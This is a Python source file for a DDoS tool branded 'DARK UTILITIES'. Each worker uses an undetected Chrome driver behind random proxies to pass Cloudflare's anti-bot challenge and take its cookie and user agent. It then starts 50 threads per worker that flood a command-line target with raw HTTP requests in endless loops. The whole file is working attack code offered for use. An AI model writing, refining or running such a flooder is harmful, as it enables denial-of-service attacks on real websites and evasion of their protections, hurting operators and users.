import random
import colored
import time
import socket
import socks
import threading
from colored import stylize
from urllib.parse import urlparse
from datetime import datetime
import undetected_chromedriver as webdriver
import sys
import ssl

class Main():
    def formatConsoleDate( date ):
        return '[' + date.strftime('%Y-%m-%d-%H:%M:%S') + ']'
        pass

    def GetArgs():
        return sys.argv;
        pass

    def GetChromeVersion( useragent ):
        return useragent.split("Chrome/")[1].split(".0.")[0]
        pass

class Target():
    def Bypass( hash_digest ):
        global config

        proxy = random.choice(config['proxies'])
        options = webdriver.ChromeOptions()
        options.add_argument("--disable-infobars")
        options.add_argument("--disable-logging")
        options.add_argument("--no-sandbox")
        options.add_argument("--proxy-server=%s" % proxy)
        options.add_argument("--incognito")
        options.add_argument("--disable-login-animations")
        options.add_argument("--disable-notifications")
        options.add_argument("--disable-default-apps")
        options.add_argument("--disable-popup-blocking")
        driver = webdriver.Chrome(options=options)

        print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
            stylize(f" New worker started", colored.fg('green')))

        driver.get('https://google.com/')
        driver.execute_script(f"window.open('{Main.GetArgs()[1]}')")
        driver.switch_to.window(driver.window_handles[1])

        # WAITING BYPASS UAM
        BypassEvent = True
        while BypassEvent:
            time.sleep(6)

            if driver.title != 'Just a moment...':
                BypassEvent = False

                print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                    stylize(f" Challenge bypassed successfully.", colored.fg('green')))

                config['threads'][hash_digest] = True

                cookieJar = driver.get_cookies()[0] if len(driver.get_cookies()) != 0 else False
                useragent = driver.execute_script("return navigator.userAgent")

                driver.quit()

                # WAITING ALL THREADS COMPLETE
                ThreadEvent = True
                while ThreadEvent:
                    time.sleep(1)

                    if all(value == True for value in config['threads'].values()):
                        ThreadEvent = False

                        proxy = {
                            'https': f'http://{proxy}'
                        }

                        if cookieJar != False:
                            cookie = f"{cookieJar['name']}={cookieJar['value']}"
                        else:
                            cookie = False
                            pass

                        print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                            stylize(f" Starting workers ...", colored.fg('green')))
                        for _ in range(50):
                            threading.Thread(target=Target.Start, args=[cookie, useragent, proxy]).start()
                            pass
                        pass
                    pass
                else:
                    driver.execute_script(f"window.open('{Main.GetArgs()[1]}')")
                    driver.switch_to.window(driver.window_handles[1])
                    pass
                pass
            pass
        pass

    def Start( cookie, useragent, proxy ):
        global config

        proxy = urlparse(proxy['https']).netloc.split(":")

        target = {}
        target['uri'] = urlparse(Main.GetArgs()[1]).path
        target['host'] = urlparse(Main.GetArgs()[1]).netloc
        target['scheme'] = urlparse(Main.GetArgs()[1]).scheme
        if ":" in urlparse(Main.GetArgs()[1]).netloc:
            target['port'] = urlparse(Main.GetArgs()[1]).netloc.split(":")[1]
        else:
            target['port'] = "443" if urlparse(Main.GetArgs()[1]).scheme == "https" else "80"
            pass

        network = {}
        network['raw'] =  'GET ' + target['uri'] + ' HTTP/2.0\r\n'
        network['raw'] += 'Host: ' + target['host'] + '\r\n'
        network['raw'] += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
        network['raw'] += 'Accept-Encoding: gzip, deflate, br\r\n'
        network['raw'] += 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
        network['raw'] += 'Cache-Control: max-age=0\r\n'
        if cookie != False:
            network['raw'] += 'Cookie: ' + cookie + '\r\n'
        network['raw'] += f'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\n'
        network['raw'] += 'sec-ch-ua-mobile: ?0\r\n'
        network['raw'] += 'sec-ch-ua-platform: "Windows"\r\n'
        network['raw'] += 'sec-fetch-dest: empty\r\n'
        network['raw'] += 'sec-fetch-mode: cors\r\n'
        network['raw'] += 'sec-fetch-site: same-origin\r\n'
        network['raw'] += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'

        if target['scheme'] == 'https':
            while True:
                try:
                    packet = socks.socksocket()
                    packet.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                    packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    packet.connect((str(target['host']), int(target['port'])))

                    packet = ssl.SSLContext().wrap_socket(packet, server_hostname=target['host'])
                    
                    try:
                        for _ in range(10):
                            packet.send(str.encode(network['raw']))
                            pass
                    except:
                        packet.close()
                        pass
                except:
                    pass
                pass
        else:
            while True:
                try:
                    packet = socks.socksocket()
                    packet.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                    packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    packet.connect((str(target['host']), int(target['port'])))

                    try:
                        for _ in range(10):
                            packet.send(str.encode(network['raw']))
                            pass
                    except:
                        packet.close()
                        pass
                except:
                    pass
                pass
            pass
        pass


def main():
    global config

    print(stylize('''
      ╔╦╗╔═╗╦═╗╦╔═    ╦ ╦╔╦╗╦╦  ╦╔╦╗╦╔═╗╔═╗
       ║║╠═╣╠╦╝╠╩╗    ║ ║ ║ ║║  ║ ║ ║║╣ ╚═╗
      ═╩╝╩ ╩╩╚═╩ ╩    ╚═╝ ╩ ╩╩═╝╩ ╩ ╩╚═╝╚═╝
           simple attacks, simple programs
    ''', colored.fg('red')))

    if len(sys.argv) < 3:
        print(stylize("""
    [ERROR]""", colored.fg('red'),
                      colored.attr('underlined'))
              + """ bad command usage

            """ + stylize("Usage Sheme:", colored.fg('#ffe900'),
                          colored.attr('underlined')) + """
                - user@some_name:~# python3 main.py <target> <threads> <proxies-file>
        """)
        sys.exit()

    config = {}
    config['proxies'] = open(sys.argv[3]).read().split("\n") 
    config['threads'] = {}

    try:
        for hash_digest in range(int(Main.GetArgs()[2])):
            time.sleep(3)

            threading.Thread(target=Target.Bypass, args=[hash_digest]).start()
            config['threads'][hash_digest] = False
            pass
    except KeyboardInterrupt:
        sys.exit()
        pass
    pass

if __name__ == '__main__':
    ################################################################################
    # This file is the worker file, there is the source-code, it will start the    #
    # browser with proxy randomly got in "./proxies.txt" and it will               #
    # get the cookies from a bypassed uam with the browser.                        #
    ################################################################################

    main()
